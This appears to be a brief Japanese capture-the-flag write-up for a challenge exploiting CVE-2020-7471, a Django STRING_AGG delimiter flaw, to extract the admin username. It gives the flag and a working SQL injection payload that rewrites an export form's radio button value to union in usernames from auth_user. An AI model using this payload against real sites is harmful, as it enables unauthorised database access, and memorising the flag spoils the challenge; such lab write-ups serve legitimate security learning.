## 7471
このサイトの管理者アカウントのユーザ名がFlagです

## 配布物
なし

## Flag
pgctf{tedeza_rize}

## Writeup
タイトルにもなっているCVE-2020-7471のSTRING_AGGの脆弱性を使う
エクスポート機能のCSV, TSVのラジオボタンのvalueをそのままSTRING_AGGのdelimiterに使用しているのでここからSQL Injectionする

`<input type="radio" name="delimiter" value="," checked>`のvalueを
```
,') as author from books_book union select username from auth_user--
```
に書き換えてダウンロード
